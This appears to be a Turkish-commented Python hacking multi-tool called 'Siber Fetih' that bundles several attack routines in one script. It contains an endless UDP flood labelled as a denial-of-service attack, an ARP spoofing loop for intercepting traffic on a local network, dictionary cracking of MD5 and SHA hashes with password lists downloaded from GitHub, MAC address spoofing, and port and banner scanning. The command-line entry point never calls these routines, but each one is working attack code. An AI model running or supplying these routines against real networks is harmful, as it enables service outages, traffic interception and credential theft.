#!/usr/bin/python3

# Siber Fetih
# Tarihi: 05/09/2021
# Yazar: Cemal YILMAZ

from os import close

try:
	import threading
	import _thread
	from typing import final
	from tqdm import tqdm
	from threading import *
	from colorama import Fore, Back, Style, init
	from multiprocessing.dummy import Pool as ThreadPool
	from cryptography.fernet import Fernet
	from bs4 import BeautifulSoup
	import scapy.all as scapy
	from datetime import datetime, timedelta
	from sys import stdout 
	from selenium import webdriver 
	from optparse import OptionParser 
	from pynput.keyboard import Key, Controller
	from termcolor import colored
	from scapy.all import Ether, ARP
	from scapy.all import *
	import pyfiglet
	import keyboard
	import paramiko
	from urllib.request import urlopen
	from threading import Thread
	from timeit import default_timer as timer
	# import inputs # reload(inputs) giriş çıkışları programlamak için
	from _thread import *
	import random
	import ray
	import os 
	import optparse 
	import socket
	import time
	import sys
	import select
	import subprocess
	import requests
	import selenium 
	import hashlib
	import sublist3r
	import urllib3
	import urllib.parse
except ModuleNotFoundError:
	print("\nProğram Modül Hatasi Verdi Modüller Yüklendikden\nSonra Program Devam Edicek\n")
	os.system("sudo apt-get install python3-pip")
	print("Program 5 Saniye Sonra Devam Edicek ..")
	time.sleep(5)


class Stor:
	def __init__(self) -> None:
		super().__init__()
	
	# Progres Bar
	def progresBar(self):
		for i in tqdm(range(100)):
			time.sleep(0.1)
	
	# Host Port Açık Kapalı
	def portSocket(self,host,port):
		q = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		q.settimeout(5)
		if q.connect_ex((host,int(port))):
			print(Fore.RED +"\n[*]"+ Style.RESET_ALL + f" Port {port} Kapalı\n")
		else:
			print(Fore.YELLOW +"\n[*]"+ Style.RESET_ALL + f" Port {port} Açık\n")
		q.close()

	# Host Servis Versiyon
	def bannerSocket(self,host,port):
		s = socket.socket()
		s.connect((host,int(port)))
		s.settimeout(5)
		print(Fore.YELLOW +"\n[*]"+ Style.RESET_ALL + " " + f"Servis Versiyon {s.recv(1024)}\n")
		s.close()
	
	# Hizmet Dışı Bırakma Saldırısı
	def Ddos(self,host,port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		bytes = random._urandom(25200)

		sent = 0
		port = int(port)

		while True:
			sock.sendto(bytes, (host,port))
			sent += 1
			print("Gönderilen Paket Sayısı: {0} İP: {1} Port:{2}".format(sent,host,port))
	
	
	# Mac Adres Değiştirme
	def change_mac_adress(self,interface,mac):
		subprocess.call(['ifconfig',interface,'down'])
		subprocess.call(['ifconfig',interface,'hw','ether',mac])
		subprocess.call(['ifconfig',interface,'up'])

	def maccahger(self,interface,new_mac):
		interface       = str(interface)
		before_change   = subprocess.check_output(['ifconfig',interface])
		self.change_mac_adress(interface,new_mac)
		after_change    = subprocess.check_output(['ifconfig',interface])
		if before_change == after_change:
			print(Fore.RED +"[*]"+ Style.RESET_ALL + f" Mac Adres Değiştirmede Hata ile karşılaşıldı: {new_mac} ")
		else:
			print(Fore.GREEN +"[*]"+ Style.RESET_ALL + f" Mac Adresiniz Değiştirildi: {new_mac} , Ağ Arayüz: {interface}")


# Şifreleme İşlemleri
class Crypto:
	def __init__(self) -> None:
		super().__init__()
   
	# python3 hack.py -H admin -t md5 -r cryptography
	def criptograpy(self,host,port):
		metin = str(host)
		crypt = str(port)
		if crypt == "md5":
			hasobj1 = hashlib.md5()
			hasobj1.update(metin.encode())
			print(hasobj1.hexdigest())
		elif crypt == "sha1":
			hasobj2 = hashlib.sha1()
			hasobj2.update(metin.encode())
			print(hasobj2.hexdigest())
		elif crypt == "sha224":
			hasobj3 = hashlib.sha224()
			hasobj3.update(metin.encode())
			print(hasobj3.hexdigest())
		elif crypt == "sha256":
			hasobj4 = hashlib.sha256()
			hasobj4.update(metin.encode())
			print(hasobj4.hexdigest())
		elif crypt == "sha512":
			hasobj5 = hashlib.sha512()
			hasobj5.update(metin.encode())
			print(hasobj5.hexdigest())
	
	# python3 hack.py -H 21232f297a57a5a743894a0e4a801fc3 -t md5 -r deciphering
	def deciphering(self,host,port):
		sha_hash    = str(host)
		crypt       = str(port)
		passlist    = str(urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
		passlist2   = str(urlopen("https://raw.githubusercontent.com/wikimedia/password-blacklist/master/scripts/data/10_million_password_list_top_100000.txt").read(),'utf-8')
		p = 0
		if crypt == "md5":
			for password in passlist.split('\n'):
				hashguess = hashlib.md5(bytes(password, 'utf-8')).hexdigest()
				if hashguess == sha_hash:
					print(colored("[*] Parolanız: " + str(password), 'green'))
					quit()
				else:
					print(colored("[*] " + str(p) + " Denenen Parola: " + str(password), 'red'))
					p += 1
			for password2 in passlist2.split('\n'):
				hashguess = hashlib.md5(bytes(password2, 'utf-8')).hexdigest()
				if hashguess == sha_hash:
					print(colored("[*] Parolanız: " + str(password2), 'green'))
					quit()
				else:
					print(colored("[*] " + str(p) + " Denenen Parola: " + str(password2), 'red'))
					p += 1
			print("listede bulunamadı")
		elif crypt == "sha1":
			for password in passlist.split('\n'):
				hashguess = hashlib.sha1(bytes(password, 'utf-8')).hexdigest()
				if hashguess == sha_hash:
					print(colored("[*] Parolanız: " + str(password), 'green'))
					quit()
				else:
					print(colored("[*] " + str(p) + " Denenen Parola: " + str(password), 'red'))
					p += 1
			print("listede bulunamadı")
		elif crypt == "sha224":
			for password in passlist.split('\n'):
				hashguess = hashlib.sha224(bytes(password, 'utf-8')).hexdigest()
				if hashguess == sha_hash:
					print(colored("[*] Parolanız: " + str(password), 'green'))
					quit()
				else:
					print(colored("[*] " + str(p) + " Denenen Parola: " + str(password), 'red'))
					p += 1
			print("listede bulunamadı")
		elif crypt == "sha256":
			for password in passlist.split('\n'):
				hashguess = hashlib.sha256(bytes(password, 'utf-8')).hexdigest()
				if hashguess == sha_hash:
					print(colored("[*] Parolanız: " + str(password), 'green'))
					quit()
				else:
					print(colored("[*] " + str(p) + " Denenen Parola: " + str(password), 'red'))
					p += 1
			print("listede bulunamadı")
		elif crypt == "sha512":
			for password in passlist.split('\n'):
				hashguess = hashlib.sha512(bytes(password, 'utf-8')).hexdigest()
				if hashguess == sha_hash:
					print(colored("[*] Parolanız: " + str(password), 'green'))
					quit()
				else:
					print(colored("[*] " + str(p) + " Denenen Parola: " + str(password), 'red'))
					p += 1
			print("listede bulunamadı")


# Arp Spoofing 
class ARPspoofing:
	def __init__(self) -> None:
		super().__init__()

	def restore(self,destination_ip, source_ip):
		destination_mac = self.get_mac(destination_ip)
		source_mac = self.get_mac(source_ip)
		packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
		scapy.send(packet, verbose = False)

	def get_mac(self,ip):
		arp_request = scapy.ARP(pdst = ip)
		broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast / arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
		return answered_list[0][1].hwsrc

	def spoof(self,target_ip, spoof_ip):
		packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = self.get_mac(target_ip),psrc = spoof_ip)
		scapy.send(packet, verbose = False)

	def arp(self,host,port):
		try:
			sent_packets_count = 0
			while True:
				self.spoof(host, port)
				self.spoof(port, host)
				sent_packets_count += 2
				print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
				time.sleep(2)
		except KeyboardInterrupt:
			print("\nCtrl + C pressed.............Exiting")
			self.restore(port, host)
			self.restore(host, port)
			print("[+] Arp Spoof Stopped")

def Fetih():
	seçenek = str(sys.argv[1]) 
	seçenek1 = str(sys.argv[2])
	seçenek2 = str(sys.argv[3])
	print(seçenek)
	print(seçenek1)
	print(seçenek2)

def Siba():
	os.system("figlet Siber Fetih")
	print('''
	./fetih.py -osint -usom x.com
		''')

try:
	if __name__ == "__main__":
		if (str(sys.argv[1]) == "-h" or str(sys.argv[1]) == "--help"):
			Siba()
		else:
			Fetih()
except BaseException:
	pass